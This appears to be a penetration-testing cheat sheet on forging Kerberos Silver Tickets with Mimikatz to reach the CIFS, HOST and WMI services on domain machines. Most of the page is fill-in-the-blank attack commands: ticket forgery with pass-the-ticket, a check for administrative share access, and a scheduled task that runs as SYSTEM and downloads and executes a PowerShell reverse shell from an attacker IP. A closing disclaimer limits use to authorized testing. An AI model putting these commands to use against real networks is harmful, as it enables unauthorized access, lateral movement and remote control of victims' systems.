---
description: >-
  Discover everything you need to know about Silver Tickets in our comprehensive
  guide. Learn origins, uses, and important facts related to Silver Tickets.
---

# 🥈 Silver Tickets

### **Make silver ticket for CIFS**

Use the hash of the local computer

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:CIFS /rc4:<local computer hash> /user:Administrator /ptt"'
```

### **Check Access (After CIFS silver ticket)**

```
ls \\<servername>\c$\
```

### **Make silver ticket for Host**

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
```

### **Schedule and execute a task (After host silver ticket)**

```
schtasks /create /S <target> /SC Weekly /RU "NT Authority\SYSTEM" /TN "Reverse" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''')'"

schtasks /Run /S <target> /TN “Reverse”
```

### **Make a silver ticket for WMI**

Execute for WMI /service:HOST /service:RPCSS

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'

Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:RPCSS /rc4:<local computer hash> /user:Administrator /ptt"'
```

### **Check WMI Permission**

```
Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
```

#### Creating Kerberos Silver Tickets using Mimikatz

This section outlines the process to create Kerberos Silver Tickets for different services allowing unauthorized access to a domain-joined computer using the Mimikatz tool.

* **CIFS Silver Ticket:** To access shared files over the network (`CIFS` service), use the local computer's hash to create the ticket.
* **HOST Silver Ticket:** To perform tasks on the host computer (`HOST` service), again use the local computer's hash.
* **WMI Silver Ticket:** For Windows Management Instrumentation access (`WMI` service), create tickets with `HOST` and `RPCSS` services specified.

**Access Verification and Task Execution**

Check access to the server's shared drive after obtaining the CIFS ticket, and create a scheduled task on the target computer after obtaining the HOST ticket. The task will reverse-connect to an attacker-controlled server.

**Verify WMI Permissions**

After obtaining the WMI Silver Ticket, verify the permissions by querying the operating system details with `Get-wmiobject`.

***

#### Security Implications

The above instructions are indicative of malicious activities that are commonly associated with lateral movement and privilege escalation in cybersecurity breaches using forged Kerberos tickets. It is crucial to ensure that these instructions are used for legal purposes such as security training or penetration testing with appropriate permissions. Unauthorized use of these techniques is illegal and unethical.

### Sources

{% embed url="https://adsecurity.org/?p=2011" %}

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets" %}
